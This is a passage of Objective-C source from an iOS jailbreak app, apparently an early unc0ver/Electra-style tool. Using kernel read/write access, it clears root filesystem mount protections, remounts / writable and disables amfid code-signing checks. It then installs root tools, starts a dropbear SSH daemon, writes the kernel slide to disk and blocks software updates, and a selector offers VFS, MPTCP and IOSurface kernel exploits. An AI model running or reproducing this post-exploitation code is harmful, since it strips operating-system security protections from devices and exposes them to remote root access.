    uint64_t v_mount = ReadAnywhere64(rootfs_vnode + offsetof_v_mount);
    uint32_t v_flag = ReadAnywhere32(v_mount + offsetof_mnt_flag);
    v_flag = v_flag & ~MNT_NOSUID;
    v_flag = v_flag & ~MNT_RDONLY;
    WriteAnywhere32(v_mount + offsetof_mnt_flag, v_flag & ~MNT_ROOTFS);
    char *dev_path = "/dev/disk0s1s1";
    _assert(mount("apfs", "/", MNT_UPDATE, (void *)&dev_path) == 0);
    v_mount = ReadAnywhere64(rootfs_vnode + offsetof_v_mount);
    WriteAnywhere32(v_mount + offsetof_mnt_flag, v_flag);
    writeTestFile("/test.txt");
    _assert(castrateAmfid() == 0);
    _assert(remap_tfp0_set_hsp4(&tfp0, zone_map_ref) == 0);
    if (!(is_directory("/jb") == 1)) {
        [[NSFileManager defaultManager] removeItemAtPath:@"/jb" error:nil];
    }
    if (access("/jb", F_OK)) {
        _assert(mkdir("/jb", 0755) == 0); _assert(chown("/jb", 0, 0) == 0);
    }
    _assert(chdir("/jb") == 0);
    if (!access("/jb/tar", F_OK)) {
        _assert(unlink("/jb/tar") == 0);
    }
    _assert(moveFileFromAppDir("tar.tar", "/jb/tar.tar") == 0);
    FILE *a = fopen("/jb/tar.tar", "rb");
    _assert(a != NULL);
    untar(a, "tar");
    _assert(fclose(a) == 0);
    _assert(chmod("/jb/tar", 0755) == 0);
    _assert(chown("/jb/tar", 0, 0) == 0);
    if (!access("/jb/lzma", F_OK)) {
        _assert(unlink("/jb/lzma") == 0);
    }
    _assert(moveFileFromAppDir("lzma.tar", "/jb/lzma.tar") == 0);
    a = fopen("/jb/lzma.tar", "rb");
    _assert(a != NULL);
    untar(a, "lzma");
    _assert(fclose(a) == 0);
    _assert(chmod("/jb/lzma", 0755) == 0);
    _assert(chown("/jb/lzma", 0, 0) == 0);
    if (!access("/jb/binpack64-256.tar.lzma", F_OK)) {
        _assert(unlink("/jb/binpack64-256.tar.lzma") == 0);
    }
    _assert(moveFileFromAppDir("binpack64-256.tar.lzma", "/jb/binpack64-256.tar.lzma") == 0);
    _assert(chmod("/jb/binpack64-256.tar.lzma", 0644) == 0);
    _assert(chown("/jb/binpack64-256.tar.lzma", 0, 0) == 0);
    if (!access("/jb/dropbear.plist", F_OK)) {
        _assert(unlink("/jb/dropbear.plist") == 0);
    }
    _assert(moveFileFromAppDir("dropbear.plist", "/jb/dropbear.plist") == 0);
    _assert(chmod("/jb/dropbear.plist", 0644) == 0);
    _assert(chown("/jb/dropbear.plist", 0, 0) == 0);
    if (!access("/jb/Filza.tar.lzma", F_OK)) {
        _assert(unlink("/jb/Filza.tar.lzma") == 0);
    }
    _assert(moveFileFromAppDir("Filza.tar.lzma", "/jb/Filza.tar.lzma") == 0);
    _assert(chmod("/jb/Filza.tar.lzma", 0644) == 0);
    _assert(chown("/jb/Filza.tar.lzma", 0, 0) == 0);
    if (!access("/jb/ReProvision.tar.lzma", F_OK)) {
        _assert(unlink("/jb/ReProvision.tar.lzma") == 0);
    }
    _assert(moveFileFromAppDir("ReProvision.tar.lzma", "/jb/ReProvision.tar.lzma") == 0);
    _assert(chmod("/jb/ReProvision.tar.lzma", 0644) == 0);
    _assert(chown("/jb/ReProvision.tar.lzma", 0, 0) == 0);
    if (!access("/jb/uicache", F_OK)) {
        _assert(unlink("/jb/uicache") == 0);
    }
    _assert(moveFileFromAppDir("uicache.tar", "/jb/uicache.tar") == 0);
    a = fopen("/jb/uicache.tar", "rb");
    _assert(a != NULL);
    untar(a, "lzma");
    _assert(fclose(a) == 0);
    _assert(chmod("/jb/uicache", 0755) == 0);
    _assert(chown("/jb/uicache", 0, 0) == 0);
    if (!access("/jb/snappy", F_OK)) {
        _assert(unlink("/jb/snappy") == 0);
    }
    _assert(moveFileFromAppDir("snappy.tar", "/jb/snappy.tar") == 0);
    a = fopen("/jb/snappy.tar", "rb");
    _assert(a != NULL);
    untar(a, "lzma");
    _assert(fclose(a) == 0);
    _assert(chmod("/jb/snappy", 0755) == 0);
    _assert(chown("/jb/snappy", 0, 0) == 0);
    if (access("/jb/amfidebilitate", F_OK)) {
        _assert(chdir("/jb") == 0);
        rv = execCommandAndWait("/jb/tar", "--use-compress-program=/jb/lzma", "-xvpkf", "/jb/binpack64-256.tar.lzma", NULL, NULL);
        _assert(rv == 512 || rv == 0);
        _assert(rename("/jb/etc/motd", "/etc/motd") == 0);
        _assert(unlink("/jb/removeMe.sh") == 0);
        _assert(moveFileFromAppDir("removeMe.sh", "/jb/removeMe.sh") == 0);
        _assert(chmod("/jb/removeMe.sh", 0755) == 0);
        _assert(chown("/jb/removeMe.sh", 0, 0) == 0);
    }
    int run_uicache = 0;
    if (access("/Applications/Filza.app", F_OK)) {
        _assert(chdir("/") == 0);
        rv = execCommandAndWait("/jb/tar", "--use-compress-program=/jb/lzma", "-xvpkf", "/jb/Filza.tar.lzma", NULL, NULL);
        _assert(rv == 512 || rv == 0);
        run_uicache = 1;
    }
    if (access("/Applications/ReProvision.app", F_OK)) {
        _assert(chdir("/") == 0);
        rv = execCommandAndWait("/jb/tar", "--use-compress-program=/jb/lzma", "-xvpkf", "/jb/ReProvision.tar.lzma", NULL, NULL);
        _assert(rv == 512 || rv == 0);
        run_uicache = 1;
    }
    _assert(execCommandAndWait("/jb/bin/cp", "-a", "/jb/uicache", "/jb/usr/bin/uicache", NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/bin/cp", "-a", "/jb/snappy", "/jb/usr/bin/snappy", NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/bin/bash", "-c", "> /.cydia_no_stash", NULL, NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/bin/rm", "-rf", "/jb/tar.tar", NULL, NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/bin/rm", "-rf", "/jb/lzma.tar", NULL, NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/bin/rm", "-rf", "/jb/tar", NULL, NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/bin/rm", "-rf", "/jb/lzma", NULL, NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/bin/rm", "-rf", "/jb/binpack64-256.tar.lzma", NULL, NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/bin/rm", "-rf", "/jb/Filza.tar.lzma", NULL, NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/bin/rm", "-rf", "/jb/ReProvision.tar.lzma", NULL, NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/bin/rm", "-rf", "/jb/uicache.tar", NULL, NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/bin/rm", "-rf", "/jb/snappy.tar", NULL, NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/bin/rm", "-rf", "/jb/uicache", NULL, NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/bin/rm", "-rf", "/jb/snappy", NULL, NULL, NULL) == 0);
    
    NSMutableDictionary *md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
    _assert(md != nil);
    for (int i = 0; !(i >= 5 || [md[@"SBShowNonDefaultSystemApps"] isEqual:@(YES)]); i++) {
        _assert(kill(findPidOfProcess("cfprefsd"), SIGSTOP) == 0);
        md[@"SBShowNonDefaultSystemApps"] = @(YES);
        _assert([md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES] == 1);
        _assert(kill(findPidOfProcess("cfprefsd"), SIGKILL) == 0);
        md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
        _assert(md != nil);
    }
    _assert([md[@"SBShowNonDefaultSystemApps"] isEqual:@(YES)]);
    _assert(execCommandAndWait("/jb/bin/rm", "-rf", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate", NULL, NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/bin/ln", "-s", "/dev/null", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate", NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/bin/rm", "-rf", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdateDocumentation", NULL, NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/bin/ln", "-s", "/dev/null", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdateDocumentation", NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/bin/rm", "-rf", "/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdate", NULL, NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/bin/ls", "-s", "/dev/null", "/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdate", NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/bin/rm", "-rf", "/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdateDocumentation", NULL, NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/bin/ls", "-s", "/dev/null", "/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdateDocumentation", NULL, NULL) == 0);
    if (access("/etc/dropbear", F_OK)) {
        _assert(mkdir("/etc/dropbear", 0755) == 0);
    }
    _assert(execCommandAndWait("/jb/bin/bash", "-c", (char *)[[NSString stringWithFormat:@"/jb/usr/bin/printf '0x%016llx\n' > /private/var/tmp/slide.txt", kernel_slide] UTF8String], NULL, NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/bin/bash", "-c", "if [[ -e /usr/local/bin/dropbear ]]; then /jb/bin/mv -f /usr/local/bin/dropbear /jb/usr/local/bin/dropbear; fi", NULL, NULL, NULL) == 0);
    _assert(spawnAndPlatformizeAndWait("/jb/bin/launchctl", "load", "/jb/dropbear.plist", NULL, NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/bin/chmod", "0755", "/Library/LaunchDaemons/com.matchstic.reprovisiond.plist", NULL, NULL, NULL) == 0);
    _assert(execCommandAndWait("/jb/usr/sbin/chown", "root:wheel", "/Library/LaunchDaemons/com.matchstic.reprovisiond.plist", NULL, NULL, NULL) == 0);
    _assert(spawnAndPlatformize("/jb/bin/launchctl", "load", "/Library/LaunchDaemons/com.matchstic.reprovisiond.plist", NULL, NULL, NULL) == 0);
    _assert(spawnAndPlatformize("/jb/amfidebilitate", NULL, NULL, NULL, NULL, NULL) == 0);
    sleep(2);
    if (run_uicache) {
        _assert(execCommandAndWait("/jb/usr/bin/uicache", NULL, NULL, NULL, NULL, NULL) == 0);
    }
    RESET_LOGS();
}

- (IBAction)Jailbreak:(id)sender {
    exploit();
}

- (IBAction)tappedOnBootNonceButton:(id)sender {
    UIAlertController *alertController = [UIAlertController alertControllerWithTitle:@"Set Boot Nonce" message:@"Enter Boot Nonce" preferredStyle:UIAlertControllerStyleAlert];
    UIAlertAction *OK = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
        [[NSUserDefaults standardUserDefaults] setObject:[[[alertController textFields] firstObject] text] forKey:@K_BOOT_NONCE];
        [[NSUserDefaults standardUserDefaults] synchronize];
        [self.BootNonceButton setTitle:[[NSUserDefaults standardUserDefaults] objectForKey:@K_BOOT_NONCE] forState:UIControlStateNormal];
    }];
    UIAlertAction *Cancel = [UIAlertAction actionWithTitle:@"Cancel" style:UIAlertActionStyleDefault handler:nil];
    [alertController addAction:Cancel];
    [alertController addAction:OK];
    [alertController setPreferredAction:OK];
    [alertController addTextFieldWithConfigurationHandler:^(UITextField *textField) {
        [textField setPlaceholder:[[NSUserDefaults standardUserDefaults] objectForKey:@K_BOOT_NONCE]];
    }];
    [self presentViewController:alertController animated:YES completion:nil];
}

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
    if (isJailbroken() == 1) {
        [self.DoItButton setEnabled:NO];
        [self.DoItButton setTitle:@"Jailbroken" forState:UIControlStateDisabled];
    } else if (!(isSupported() == 1)) {
        [self.DoItButton setEnabled:NO];
        [self.DoItButton setTitle:@"Unsupported" forState:UIControlStateDisabled];
    }
    int Exploit = selectExploit();
    switch (Exploit) {
        case 0: {
            [self.KernelExploitLabel setText:@"Kernel Exploit: VFS"];
            break;
        }
        case 1: {
            [self.KernelExploitLabel setText:@"Kernel Exploit: MPTCP"];
            break;
        }
        case 2: {
            [self.KernelExploitLabel setText:@"Kernel Exploit: IOSurface"];
            break;
        }
        default:
            [self.KernelExploitLabel setText:@"Kernel Exploit: None"];
            break;
    }
    [self.BootNonceButton setTitle:[[NSUserDefaults standardUserDefaults] objectForKey:@K_BOOT_NONCE] forState:UIControlStateNormal];
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}


-(NSURL *)getURLForUserName:(NSString *)userName {
    if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"tweetbot://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"tweetbot:///user_profile/%@", userName]];
    } else if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"twitterrific://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"twitterrific:///profile?screen_name=%@", userName]];
    } else if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"tweetings://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"tweetings:///user?screen_name=%@", userName]];
    } else if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"twitter://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"https://mobile.twitter.com/%@", userName]];
    } else {
        return [NSURL URLWithString:[NSString stringWithFormat:@"https://mobile.twitter.com/%@", userName]];
    }
}

- (IBAction)tappedOnPwn:(id)sender{
    [[UIApplication sharedApplication] openURL:[self getURLForUserName:@"Pwn20wnd"] options:@{} completionHandler:nil];
}

-(IBAction)tappedOnXerub:(id)sender{
    [[UIApplication sharedApplication] openURL:[self getURLForUserName:@"xerub"] options:@{} completionHandler:nil];
}

-(IBAction)tappedOnStek:(id)sender{
    [[UIApplication sharedApplication] openURL:[self getURLForUserName:@"stek29"] options:@{} completionHandler:nil];
}

-(IBAction)tappedOnGeoSn0w:(id)sender{
    [[UIApplication sharedApplication] openURL:[self getURLForUserName:@"FCE365"] options:@{} completionHandler:nil];
}

-(IBAction)tappedOnIanBeer:(id)sender{
    [[UIApplication sharedApplication] openURL:[self getURLForUserName:@"i41nbeer"] options:@{} completionHandler:nil];
}

-(IBAction)tappedOnMorpheus:(id)sender{
    [[UIApplication sharedApplication] openURL:[self getURLForUserName:@"morpheus______"] options:@{} completionHandler:nil];
}

@end
